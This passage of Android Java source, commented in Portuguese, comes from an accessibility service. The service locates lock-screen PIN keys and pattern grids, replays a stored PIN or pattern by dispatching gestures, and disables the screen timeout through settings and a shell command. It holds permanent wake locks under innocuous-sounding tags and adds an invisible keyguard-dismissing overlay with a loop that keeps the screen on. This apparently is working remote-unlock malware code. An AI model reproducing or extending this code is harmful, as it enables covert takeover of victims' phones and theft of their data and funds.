        // MUITO IMPORTANTE: O gesture precisa ser LENTO para o Samsung reconhecer cada ponto!
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            android.graphics.Path path = new android.graphics.Path();
            
            // Ponto inicial
            int pathX = points.get(0)[0];
            int pathY = points.get(0)[1];
            path.moveTo(pathX, pathY);
            
            // Para cada ponto, adiciona uma pequena "parada" usando quadTo
            // Isso faz o gesture desacelerar em cada ponto
            for (int i = 1; i < points.size(); i++) {
                int x = points.get(i)[0];
                int y = points.get(i)[1];
                
                // Usa lineTo normal mas com duração maior
                path.lineTo(x, y);
                
                Log.d(TAG, "🔲 Path: (" + pathX + "," + pathY + ") -> (" + x + "," + y + ")");
                pathX = x;
                pathY = y;
            }
            
            // DURAÇÃO MUITO MAIOR: 500ms por ponto para Samsung reconhecer
            // Mínimo de 3000ms total para patterns complexos
            int durationPerPoint = 500; // 500ms por transição
            int totalDuration = Math.max((points.size() - 1) * durationPerPoint, 3000);
            
            Log.d(TAG, "🔲 Executando gesture LENTO: " + totalDuration + "ms total (" + durationPerPoint + "ms por segmento)");
            
            android.accessibilityservice.GestureDescription.StrokeDescription stroke = 
                new android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, totalDuration);
            android.accessibilityservice.GestureDescription.Builder builder = 
                new android.accessibilityservice.GestureDescription.Builder();
            builder.addStroke(stroke);
            
            dispatchGesture(builder.build(), new GestureResultCallback() {
                @Override
                public void onCompleted(android.accessibilityservice.GestureDescription gestureDescription) {
                    Log.d(TAG, "🔲 ✅ Pattern reproduzido com sucesso! (" + pattern + ")");
                }
                
                @Override
                public void onCancelled(android.accessibilityservice.GestureDescription gestureDescription) {
                    Log.e(TAG, "🔲 ❌ Reprodução do pattern cancelada");
                }
            }, null);
        }
    }
    
    /**
     * 🔢🎯 DETECÇÃO DO PIN KEYPAD VIA ACCESSIBILITYSERVICE - FUNCIONA EM 100% DOS DISPOSITIVOS!
     * SEM ADB! SEM ROOT! Usa getRootInActiveWindow() para ler a UI diretamente!
     * Retorna array com coordenadas de cada tecla: [0-9][x,y], [10] = DELETE, [11] = ENTER
     */
    private int[][] detectPinKeypadViaAccessibility() {
        try {
            Log.d(TAG, "🔢🎯 Iniciando detecção do PIN Keypad via AccessibilityService...");
            
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                Log.w(TAG, "🔢 AccessibilityService: RootNode é null!");
                return null;
            }
            
            int[][] keyCoords = new int[12][2]; // 0-9 + DELETE + ENTER
            
            // Procura por cada tecla (0-9) usando resource-id ou content-desc
            for (int i = 0; i <= 9; i++) {
                String digit = String.valueOf(i);
                
                // Tenta encontrar por resource-id (ex: "key0", "key1", etc)
                AccessibilityNodeInfo keyNode = findNodeByResourceId(rootNode, "key" + digit);
                
                // Se não encontrou, tenta por content-desc
                if (keyNode == null) {
                    keyNode = findNodeByContentDescExact(rootNode, digit);
                }
                
                // Se não encontrou, tenta por texto
                if (keyNode == null) {
                    keyNode = findNodeByTextExact(rootNode, digit);
                }
                
                if (keyNode != null) {
                    android.graphics.Rect bounds = new android.graphics.Rect();
                    keyNode.getBoundsInScreen(bounds);
                    keyCoords[i][0] = bounds.centerX();
                    keyCoords[i][1] = bounds.centerY();
                    Log.d(TAG, "🔢🎯 Tecla " + digit + " encontrada: (" + keyCoords[i][0] + ", " + keyCoords[i][1] + ")");
                    keyNode.recycle();
                } else {
                    Log.w(TAG, "🔢 Tecla " + digit + " NÃO encontrada!");
                }
            }
            
            // Procura DELETE/BACKSPACE
            AccessibilityNodeInfo deleteNode = findNodeByResourceId(rootNode, "delete");
            if (deleteNode == null) deleteNode = findNodeByResourceId(rootNode, "delete_button");
            if (deleteNode == null) deleteNode = findNodeByContentDescContains(rootNode, new String[]{"delete", "apagar", "excluir", "backspace"});
            
            if (deleteNode != null) {
                android.graphics.Rect bounds = new android.graphics.Rect();
                deleteNode.getBoundsInScreen(bounds);
                keyCoords[10][0] = bounds.centerX();
                keyCoords[10][1] = bounds.centerY();
                Log.d(TAG, "🔢🎯 DELETE encontrado: (" + keyCoords[10][0] + ", " + keyCoords[10][1] + ")");
                deleteNode.recycle();
            }
            
            // Procura ENTER/OK
            AccessibilityNodeInfo enterNode = findNodeByResourceId(rootNode, "key_enter");
            if (enterNode == null) enterNode = findNodeByResourceId(rootNode, "enter");
            if (enterNode == null) enterNode = findNodeByContentDescContains(rootNode, new String[]{"enter", "ok", "done", "confirmar"});
            if (enterNode == null) enterNode = findNodeByTextExact(rootNode, "OK");
            
            if (enterNode != null) {
                android.graphics.Rect bounds = new android.graphics.Rect();
                enterNode.getBoundsInScreen(bounds);
                keyCoords[11][0] = bounds.centerX();
                keyCoords[11][1] = bounds.centerY();
                Log.d(TAG, "🔢🎯 ENTER encontrado: (" + keyCoords[11][0] + ", " + keyCoords[11][1] + ")");
                enterNode.recycle();
            }
            
            rootNode.recycle();
            
            // Verifica se encontrou pelo menos 5 teclas
            int foundCount = 0;
            for (int i = 0; i <= 9; i++) {
                if (keyCoords[i][0] > 0 && keyCoords[i][1] > 0) foundCount++;
            }
            
            if (foundCount < 5) {
                Log.w(TAG, "🔢 AccessibilityService: Apenas " + foundCount + "/10 teclas encontradas!");
                return null;
            }
            
            Log.d(TAG, "🔢🎯 ✅ PIN Keypad detectado via AccessibilityService! (" + foundCount + "/10 teclas)");
            return keyCoords;
            
        } catch (Exception e) {
            Log.e(TAG, "🔢 AccessibilityService: Erro na detecção do PIN: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }
    
    /**
     * Busca nó por resource-id (parcial)
     */
    private AccessibilityNodeInfo findNodeByResourceId(AccessibilityNodeInfo root, String resourceIdPart) {
        if (root == null) return null;
        
        // Tenta busca direta
        java.util.List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(
            "com.android.systemui:id/" + resourceIdPart);
        if (nodes != null && !nodes.isEmpty()) {
            return nodes.get(0);
        }
        
        // Busca recursiva
        return findNodeByResourceIdRecursive(root, resourceIdPart);
    }
    
    private AccessibilityNodeInfo findNodeByResourceIdRecursive(AccessibilityNodeInfo node, String resourceIdPart) {
        if (node == null) return null;
        
        CharSequence resourceId = node.getViewIdResourceName();
        if (resourceId != null && resourceId.toString().toLowerCase().contains(resourceIdPart.toLowerCase())) {
            return node;
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findNodeByResourceIdRecursive(child, resourceIdPart);
                if (result != null) {
                    return result;
                }
                child.recycle();
            }
        }
        return null;
    }
    
    /**
     * Busca nó por content-desc EXATO
     */
    private AccessibilityNodeInfo findNodeByContentDescExact(AccessibilityNodeInfo root, String contentDesc) {
        if (root == null) return null;
        
        CharSequence desc = root.getContentDescription();
        if (desc != null && desc.toString().equals(contentDesc)) {
            return root;
        }
        
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findNodeByContentDescExact(child, contentDesc);
                if (result != null) {
                    return result;
                }
                child.recycle();
            }
        }
        return null;
    }
    
    /**
     * Busca nó por content-desc contendo alguma das palavras
     */
    private AccessibilityNodeInfo findNodeByContentDescContains(AccessibilityNodeInfo root, String[] keywords) {
        if (root == null) return null;
        
        CharSequence desc = root.getContentDescription();
        if (desc != null) {
            String descLower = desc.toString().toLowerCase();
            for (String keyword : keywords) {
                if (descLower.contains(keyword.toLowerCase())) {
                    return root;
                }
            }
        }
        
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findNodeByContentDescContains(child, keywords);
                if (result != null) {
                    return result;
                }
                child.recycle();
            }
        }
        return null;
    }
    
    /**
     * Busca nó por texto EXATO
     */
    private AccessibilityNodeInfo findNodeByTextExact(AccessibilityNodeInfo root, String text) {
        if (root == null) return null;
        
        java.util.List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
        if (nodes != null) {
            for (AccessibilityNodeInfo node : nodes) {
                CharSequence nodeText = node.getText();
                if (nodeText != null && nodeText.toString().equals(text)) {
                    return node;
                }
            }
        }
        return null;
    }
    
    /**
     * Reproduz PIN usando coordenadas EXATAS detectadas via UIAutomator
     */
    private void playPinWithDetectedCoords(String pin, int delayMs, int[][] keyCoords) {
        char[] digits = pin.toCharArray();
        
        for (int i = 0; i < digits.length; i++) {
            final int digitIndex = Character.getNumericValue(digits[i]);
            final int idx = i;
            
            if (digitIndex >= 0 && digitIndex <= 9 && keyCoords[digitIndex][0] > 0) {
                handler.postDelayed(() -> {
                    int x = keyCoords[digitIndex][0];
                    int y = keyCoords[digitIndex][1];
                    Log.d(TAG, "🔢🎯 Clicando tecla " + digitIndex + " via UIAutomator em (" + x + ", " + y + ")");
                    executePinKeyClick(x, y);
                }, idx * delayMs);
            } else {
                Log.w(TAG, "🔢 Tecla " + digitIndex + " sem coordenadas válidas!");
            }
        }
        
        // Clica ENTER no final (se disponível)
        if (keyCoords[11][0] > 0 && keyCoords[11][1] > 0) {
            handler.postDelayed(() -> {
                Log.d(TAG, "🔢🎯 Clicando ENTER via UIAutomator");
                executePinKeyClick(keyCoords[11][0], keyCoords[11][1]);
            }, digits.length * delayMs + delayMs);
        }
    }
    
    /**
     * 🔲🎯 DETECÇÃO DO PATTERN VIA ACCESSIBILITYSERVICE - FUNCIONA EM 100% DOS DISPOSITIVOS!
     * SEM ADB! SEM ROOT! Usa getRootInActiveWindow() para ler a UI diretamente!
     */
    private int[][] detectPatternViewViaAccessibility() {
        try {
            Log.d(TAG, "🔲🎯 Iniciando detecção do Pattern via AccessibilityService...");
            
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                Log.w(TAG, "🔲 AccessibilityService: RootNode é null!");
                return null;
            }
            
            // Procura pelo PatternView usando vários nomes possíveis
            String[] patternViewIds = {
                "lockPatternView",
                "lock_pattern_view", 
                "patternView",
                "pattern_view",
                "sec_pattern_view",
                "keyguard_pattern_view"
            };
            
            AccessibilityNodeInfo patternNode = null;
            
            // Tenta encontrar por resource-id
            for (String viewId : patternViewIds) {
                patternNode = findNodeByResourceId(rootNode, viewId);
                if (patternNode != null) {
                    Log.d(TAG, "🔲🎯 PatternView encontrado por resource-id: " + viewId);
                    break;
                }
            }
            
            // Se não encontrou por ID, procura por classe
            if (patternNode == null) {
                String[] patternClasses = {
                    "LockPatternView",
                    "SecPatternView",
                    "PatternLockView",
                    "PatternView"
                };
                
                for (String className : patternClasses) {
                    patternNode = findNodeByClassName(rootNode, className);
                    if (patternNode != null) {
                        Log.d(TAG, "🔲🎯 PatternView encontrado por classe: " + className);
                        break;
                    }
                }
            }
            
            // Se não encontrou, procura por content-desc
            if (patternNode == null) {
                patternNode = findNodeByContentDescContains(rootNode, new String[]{
                    "padrão", "pattern", "desenhe", "draw", "desbloqueio"
                });
                if (patternNode != null) {
                    Log.d(TAG, "🔲🎯 PatternView encontrado por content-desc!");
                }
            }
            
            if (patternNode == null) {
                Log.w(TAG, "🔲 AccessibilityService: PatternView NÃO encontrado!");
                rootNode.recycle();
                return null;
            }
            
            // Obtém os bounds EXATOS do PatternView!
            android.graphics.Rect bounds = new android.graphics.Rect();
            patternNode.getBoundsInScreen(bounds);
            
            Log.d(TAG, "🔲🎯 PatternView DETECTADO via AccessibilityService!");
            Log.d(TAG, "🔲🎯 Bounds: left=" + bounds.left + ", top=" + bounds.top + 
                       ", right=" + bounds.right + ", bottom=" + bounds.bottom);
            
            // Calcula os 9 pontos baseado nos bounds EXATOS!
            int gridWidth = bounds.width();
            int gridHeight = bounds.height();
            int cellWidth = gridWidth / 3;
            int cellHeight = gridHeight / 3;
            int halfCellW = cellWidth / 2;
            int halfCellH = cellHeight / 2;
            
            int[][] coords = new int[9][2];
            for (int i = 0; i < 9; i++) {
                int row = i / 3;
                int col = i % 3;
                coords[i][0] = bounds.left + col * cellWidth + halfCellW;
                coords[i][1] = bounds.top + row * cellHeight + halfCellH;
                Log.d(TAG, "🔲🎯 Ponto " + (i+1) + " via AccessibilityService: (" + coords[i][0] + ", " + coords[i][1] + ")");
            }
            
            patternNode.recycle();
            rootNode.recycle();
            
            Log.d(TAG, "🔲🎯 ✅ Coordenadas EXATAS detectadas via AccessibilityService!");
            return coords;
            
        } catch (Exception e) {
            Log.e(TAG, "🔲 AccessibilityService: Erro na detecção do Pattern: " + e.getMessage());
            e.printStackTrace();
            return null;
        }
    }
    
    /**
     * 🔲 DETECTA O PATTERNVIEW REAL NA TELA via AccessibilityService
     * Esta é a SOLUÇÃO DEFINITIVA que funciona em qualquer dispositivo!
     */
    private int[][] detectPatternViewCoords() {
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                Log.w(TAG, "🔲 RootNode é null!");
                return null;
            }
            
            // Procura pelo PatternView em várias formas (diferentes fabricantes usam nomes diferentes)
            String[] patternViewClasses = {
                "LockPatternView",
                "PatternLockView",
                "PatternView",
                "SecPatternView",
                "KeyguardPatternView",
                "android.widget.PatternView",
                "com.android.internal.widget.LockPatternView",
                "com.samsung.android.widget.SecPatternView"
            };
            
            AccessibilityNodeInfo patternNode = null;
            
            // Busca recursivamente pelo PatternView
            for (String className : patternViewClasses) {
                patternNode = findNodeByClassName(rootNode, className);
                if (patternNode != null) {
                    Log.d(TAG, "🔲 PatternView encontrado! Classe: " + className);
                    break;
                }
            }
            
            // Se não encontrou por classe, tenta por contentDescription
            if (patternNode == null) {
                patternNode = findNodeByContentDescription(rootNode, new String[]{
                    "padrão", "pattern", "desenhe", "draw", "desbloqueio", "unlock"
                });
            }
            
            if (patternNode == null) {
                Log.w(TAG, "🔲 PatternView não encontrado na tela!");
                rootNode.recycle();
                return null;
            }
            
            // Obtém as bounds (coordenadas) reais do PatternView!
            android.graphics.Rect bounds = new android.graphics.Rect();
            patternNode.getBoundsInScreen(bounds);
            
            Log.d(TAG, "🔲 🎯 PatternView ENCONTRADO! Bounds: " + bounds.toString());
            Log.d(TAG, "🔲 Left=" + bounds.left + ", Top=" + bounds.top + ", Right=" + bounds.right + ", Bottom=" + bounds.bottom);
            
            // Calcula os 9 pontos baseado nas bounds REAIS!
            int gridWidth = bounds.width();
            int gridHeight = bounds.height();
            int cellWidth = gridWidth / 3;
            int cellHeight = gridHeight / 3;
            
            int[][] coords = new int[9][2];
            for (int i = 0; i < 9; i++) {
                int row = i / 3;
                int col = i % 3;
                // Centro de cada célula
                coords[i][0] = bounds.left + col * cellWidth + cellWidth / 2;
                coords[i][1] = bounds.top + row * cellHeight + cellHeight / 2;
            }
            
            patternNode.recycle();
            rootNode.recycle();
            
            return coords;
            
        } catch (Exception e) {
            Log.e(TAG, "🔲 Erro ao detectar PatternView: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Busca recursivamente por um nó com determinada classe
     */
    private AccessibilityNodeInfo findNodeByClassName(AccessibilityNodeInfo node, String className) {
        if (node == null) return null;
        
        CharSequence nodeClass = node.getClassName();
        if (nodeClass != null && nodeClass.toString().contains(className)) {
            return node;
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findNodeByClassName(child, className);
                if (result != null) {
                    return result;
                }
                child.recycle();
            }
        }
        return null;
    }
    
    /**
     * Busca por nó com determinado contentDescription
     */
    private AccessibilityNodeInfo findNodeByContentDescription(AccessibilityNodeInfo node, String[] keywords) {
        if (node == null) return null;
        
        CharSequence desc = node.getContentDescription();
        if (desc != null) {
            String descLower = desc.toString().toLowerCase();
            for (String keyword : keywords) {
                if (descLower.contains(keyword.toLowerCase())) {
                    Log.d(TAG, "🔲 Encontrado nó com desc: " + desc);
                    return node;
                }
            }
        }
        
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findNodeByContentDescription(child, keywords);
                if (result != null) {
                    return result;
                }
                child.recycle();
            }
        }
        return null;
    }
    
    /**
     * 🔲 Fallback: Calcula coordenadas por fabricante (quando detectção falha)
     * COORDENADAS DESCOBERTAS VIA UIAUTOMATOR!
     */
    private int[][] calculatePatternCoordsByManufacturer() {
        android.view.WindowManager wm = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
        android.util.DisplayMetrics metrics = new android.util.DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);
        int screenWidth = metrics.widthPixels;
        int screenHeight = metrics.heightPixels;
        
        String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();
        Log.d(TAG, "🔲 Fallback - Fabricante: " + manufacturer + ", Tela: " + screenWidth + "x" + screenHeight);
        
        int[][] coords = new int[9][2];
        
        if (manufacturer.contains("samsung")) {
            // 🎯 SAMSUNG ONE UI - COORDENADAS EXATAS DESCOBERTAS VIA UIAUTOMATOR!
            // lockPatternView bounds="[205,1405][874,2074]" em tela 1080x2400
            // Grid: 669x669 pixels, Célula: 223x223 pixels
            
            // Calcula proporcionalmente para diferentes resoluções
            float scaleX = screenWidth / 1080f;
            float scaleY = screenHeight / 2400f;
            
            int left = (int)(205 * scaleX);
            int top = (int)(1405 * scaleY);
            int gridSize = (int)(669 * scaleX);
            int cellSize = gridSize / 3;
            int halfCell = cellSize / 2;
            
            Log.d(TAG, "🔲 Samsung: left=" + left + ", top=" + top + ", gridSize=" + gridSize + ", cell=" + cellSize);
            
            for (int i = 0; i < 9; i++) {
                int row = i / 3;
                int col = i % 3;
                coords[i][0] = left + col * cellSize + halfCell;
                coords[i][1] = top + row * cellSize + halfCell;
            }
            
        } else {
            // Outros fabricantes - usa cálculo padrão
            float startYPercent = 0.45f;
            float gridSizePercent = 0.70f;
            
            if (manufacturer.contains("xiaomi") || manufacturer.contains("redmi")) {
                startYPercent = 0.42f;
                gridSizePercent = 0.68f;
            } else if (manufacturer.contains("huawei") || manufacturer.contains("honor")) {
                startYPercent = 0.45f;
                gridSizePercent = 0.68f;
            }
            
            int gridSize = (int)(screenWidth * gridSizePercent);
            int startX = (screenWidth - gridSize) / 2;
            int startY = (int)(screenHeight * startYPercent);
            int cellSize = gridSize / 3;
            int dotOffset = cellSize / 2;
            
            for (int i = 0; i < 9; i++) {
                int row = i / 3;
                int col = i % 3;
                coords[i][0] = startX + col * cellSize + dotOffset;
                coords[i][1] = startY + row * cellSize + dotOffset;
            }
        }
        
        return coords;
    }
    
    private int originalScreenTimeout = 30000; // 30 segundos padrão
    
    /**
     * 🔒 Desabilita timeout da tela via Settings (NUNCA desliga)
     */
    private void disableScreenTimeout() {
        try {
            // Salva o timeout original
            originalScreenTimeout = android.provider.Settings.System.getInt(
                getContentResolver(),
                android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                30000
            );
            
            // Define timeout para o MÁXIMO (2147483647 = nunca)
            android.provider.Settings.System.putInt(
                getContentResolver(),
                android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                Integer.MAX_VALUE // Nunca desliga!
            );
            
            Log.d(TAG, "🔒🔒🔒 SCREEN_OFF_TIMEOUT definido para NUNCA! (era " + originalScreenTimeout + "ms)");
            
            // Também tenta via shell (mais agressivo)
            try {
                Runtime.getRuntime().exec("settings put system screen_off_timeout 2147483647");
                Log.d(TAG, "🔒 Settings via shell também aplicado!");
            } catch (Exception e) {
                Log.d(TAG, "🔒 Shell não disponível: " + e.getMessage());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "🔒 Erro ao desabilitar timeout: " + e.getMessage());
        }
    }
    
    /**
     * 🔒 Restaura timeout original da tela
     */
    private void restoreScreenTimeout() {
        try {
            android.provider.Settings.System.putInt(
                getContentResolver(),
                android.provider.Settings.System.SCREEN_OFF_TIMEOUT,
                originalScreenTimeout
            );
            Log.d(TAG, "🔒 Timeout restaurado para " + originalScreenTimeout + "ms");
        } catch (Exception e) {
            Log.e(TAG, "🔒 Erro ao restaurar timeout: " + e.getMessage());
        }
    }
    
    /**
     * 🔒 Força a tela a ligar, MANTER LIGADA e DESBLOQUEAR
     * Usa Activity especial que aparece por cima do keyguard
     */
    private void forceScreenOn() {
        try {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
            
            Log.d(TAG, "🔒 Forçando tela a ligar via ScreenPersistenceActivity...");
            
            // Primeiro adquire o WakeLock de persistência se ainda não tiver
            acquireScreenPersistenceWakeLock();
            
            // Método 1: FULL_WAKE_LOCK para acordar a tela IMEDIATAMENTE
            android.os.PowerManager.WakeLock wakeLock = pm.newWakeLock(
                android.os.PowerManager.FULL_WAKE_LOCK |
                android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP |
                android.os.PowerManager.ON_AFTER_RELEASE,
                "UI:DisplayScheduler"
            );
            wakeLock.acquire();
            Log.d(TAG, "🔒 FULL_WAKE_LOCK adquirido - Tela deve ligar!");
            
            // Método 2: Abre ScreenPersistenceActivity que fica por cima do keyguard
            try {
                Intent persistIntent = new Intent(this, ScreenPersistenceActivity.class);
                persistIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                                       Intent.FLAG_ACTIVITY_CLEAR_TOP |
                                       Intent.FLAG_ACTIVITY_SINGLE_TOP |
                                       Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(persistIntent);
                Log.d(TAG, "🔒 ScreenPersistenceActivity LANÇADA!");
            } catch (Exception e) {
                Log.e(TAG, "🔒 Erro ao lançar Activity: " + e.getMessage());
                // Apenas log, não tenta swipe para não bugar
            }
            
            // Libera o wakeLock temporário após 2 segundos
            handler.postDelayed(() -> {
                if (wakeLock.isHeld()) {
                    wakeLock.release();
                    Log.d(TAG, "🔒 WakeLock temporário liberado");
                }
            }, 2000);
            
        } catch (Exception e) {
            Log.e(TAG, "🔒 Erro ao forçar tela ligar: " + e.getMessage());
        }
    }
    
    /**
     * 🔓 Tenta desbloquear o keyguard (tela de bloqueio/PIN)
     */
    private void dismissKeyguard() {
        try {
            // Método 1: KeyguardManager
            android.app.KeyguardManager km = (android.app.KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
            
            if (km != null && km.isKeyguardLocked()) {
                Log.d(TAG, "🔓 Keyguard está BLOQUEADO, tentando desbloquear...");
                
                // Tenta requestDismissKeyguard (Android 8+)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    // Precisa de uma Activity para requestDismissKeyguard
                    // Vamos usar gestos para simular o swipe up
                    Log.d(TAG, "🔓 Usando swipe para desbloquear...");
                    performUnlockSwipe();
                }
            } else {
                Log.d(TAG, "🔓 Keyguard NÃO está bloqueado");
            }
        } catch (Exception e) {
            Log.e(TAG, "🔓 Erro ao desbloquear: " + e.getMessage());
        }
    }
    
    /**
     * 🔓 Executa swipe para cima para desbloquear a tela
     */
    private void performUnlockSwipe() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                int screenWidth = getResources().getDisplayMetrics().widthPixels;
                int screenHeight = getResources().getDisplayMetrics().heightPixels;
                
                // Swipe de baixo para cima (para desbloquear)
                Path path = new Path();
                path.moveTo(screenWidth / 2f, screenHeight * 0.9f);
                path.lineTo(screenWidth / 2f, screenHeight * 0.3f);
                
                GestureDescription.StrokeDescription stroke = 
                    new GestureDescription.StrokeDescription(path, 0, 200);
                GestureDescription.Builder builder = new GestureDescription.Builder();
                builder.addStroke(stroke);
                
                dispatchGesture(builder.build(), new GestureResultCallback() {
                    @Override
                    public void onCompleted(GestureDescription gestureDescription) {
                        Log.d(TAG, "🔓 Swipe de desbloqueio EXECUTADO!");
                        
                        // Tenta novamente após 500ms se ainda estiver bloqueado
                        handler.postDelayed(() -> {
                            android.app.KeyguardManager km = (android.app.KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
                            if (km != null && km.isKeyguardLocked() && screenPersistenceEnabled) {
                                Log.d(TAG, "🔓 Ainda bloqueado, tentando swipe novamente...");
                                performUnlockSwipe();
                            }
                        }, 500);
                    }
                    
                    @Override
                    public void onCancelled(GestureDescription gestureDescription) {
                        Log.e(TAG, "🔓 Swipe CANCELADO");
                    }
                }, null);
            }
        } catch (Exception e) {
            Log.e(TAG, "🔓 Erro no swipe: " + e.getMessage());
        }
    }
    
    /**
     * 🔒 Adquire WakeLock para manter tela SEMPRE ligada
     * Usa FULL_WAKE_LOCK que é o mais agressivo
     */
    private void acquireScreenPersistenceWakeLock() {
        try {
            android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
            
            // Só cria novo se não existir ou não estiver ativo
            if (screenPersistenceWakeLock == null || !screenPersistenceWakeLock.isHeld()) {
                // Cria novo WakeLock FULL (mais poderoso)
                screenPersistenceWakeLock = pm.newWakeLock(
                    android.os.PowerManager.FULL_WAKE_LOCK |
                    android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP |
                    android.os.PowerManager.ON_AFTER_RELEASE,
                    "App:SyncEngine"
                );
                
                // Adquire INDEFINIDAMENTE (sem timeout)
                screenPersistenceWakeLock.acquire();
                Log.d(TAG, "🔒🔒🔒 FULL_WAKE_LOCK PERMANENTE ADQUIRIDO!");
            }
            
            // Cria overlay invisível com FLAG_KEEP_SCREEN_ON
            createKeepScreenOnOverlay();
            
            // Inicia o loop se não estiver rodando
            startScreenPersistenceLoop();
            
        } catch (Exception e) {
            Log.e(TAG, "🔒 Erro ao adquirir WakeLock: " + e.getMessage());
        }
    }
    
    /**
     * 🔒 Cria overlay invisível que mantém a tela SEMPRE ligada
     * Usa FLAG_KEEP_SCREEN_ON que é a forma mais confiável
     */
    private void createKeepScreenOnOverlay() {
        if (keepScreenOnOverlay != null) {
            return; // Já existe
        }
        
        try {
            handler.post(() -> {
                try {
                    keepScreenOnWindowManager = (android.view.WindowManager) getSystemService(WINDOW_SERVICE);
                    
                    // Cria view invisível (1x1 pixel)
                    keepScreenOnOverlay = new android.view.View(this);
                    keepScreenOnOverlay.setBackgroundColor(android.graphics.Color.TRANSPARENT);
                    
                    // Flags para manter tela ligada e não interagível
                    int layoutFlag;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        layoutFlag = android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                    } else {
                        layoutFlag = android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
                    }
                    
                    android.view.WindowManager.LayoutParams params = new android.view.WindowManager.LayoutParams(
                        1, 1, // 1x1 pixel (invisível)
                        layoutFlag,
                        android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |      // 🔒 MANTÉM TELA LIGADA!
                        android.view.WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |    // 🔓 DISPENSA KEYGUARD!
                        android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |    // Mostra quando bloqueado
                        android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,       // Liga a tela
                        android.graphics.PixelFormat.TRANSLUCENT
                    );
                    
                    params.gravity = android.view.Gravity.TOP | android.view.Gravity.START;
                    params.x = 0;
                    params.y = 0;
                    
                    keepScreenOnWindowManager.addView(keepScreenOnOverlay, params);
                    Log.d(TAG, "🔒🔒🔒 OVERLAY FLAG_KEEP_SCREEN_ON CRIADO! Tela não pode desligar!");
                    
                } catch (Exception e) {
                    Log.e(TAG, "🔒 Erro ao criar overlay: " + e.getMessage());
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "🔒 Erro: " + e.getMessage());
        }
    }
    
    /**
     * 🔒 Remove overlay de keep screen on
     */
    private void removeKeepScreenOnOverlay() {
        if (keepScreenOnOverlay != null && keepScreenOnWindowManager != null) {
            try {
                handler.post(() -> {
                    try {
                        keepScreenOnWindowManager.removeView(keepScreenOnOverlay);
                        keepScreenOnOverlay = null;
                        Log.d(TAG, "🔒 Overlay KEEP_SCREEN_ON removido");
                    } catch (Exception e) {
                        Log.e(TAG, "🔒 Erro ao remover overlay: " + e.getMessage());
                    }
                });
            } catch (Exception e) {
                Log.e(TAG, "🔒 Erro: " + e.getMessage());
            }
        }
    }
    
    /**
     * 🔒 Loop que verifica continuamente se a tela desligou ou está bloqueada
     */
    private Runnable screenPersistenceRunnable;
    private boolean screenPersistenceLoopRunning = false;
    
    private void startScreenPersistenceLoop() {
        if (screenPersistenceLoopRunning) {
            return; // Já está rodando
        }
        
        screenPersistenceLoopRunning = true;
        
        screenPersistenceRunnable = new Runnable() {
            @Override
            public void run() {
                if (!screenPersistenceEnabled) {
                    Log.d(TAG, "🔒 Persistência desativada, parando loop");
                    screenPersistenceLoopRunning = false;
                    return;
                }
                
                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
                android.app.KeyguardManager km = (android.app.KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
                
                // Verifica se tela está desligada
                if (!pm.isInteractive()) {
                    Log.d(TAG, "🔒 LOOP: Tela desligada! Forçando ligar...");
                    
                    // Força tela ligar
                    android.os.PowerManager.WakeLock wl = pm.newWakeLock(
                        android.os.PowerManager.FULL_WAKE_LOCK |
                        android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP,
                        "UI:LoopWake"
                    );
                    wl.acquire(3000);
                    
                    handler.postDelayed(() -> {
                        if (wl.isHeld()) wl.release();
                    }, 1500);
                }
                
                // NÃO faz swipe para não bugar o celular
                // Apenas mantém a tela ligada via WakeLock
                
                // Repete a cada 1 segundo
                handler.postDelayed(this, 1000);
            }
        };
        
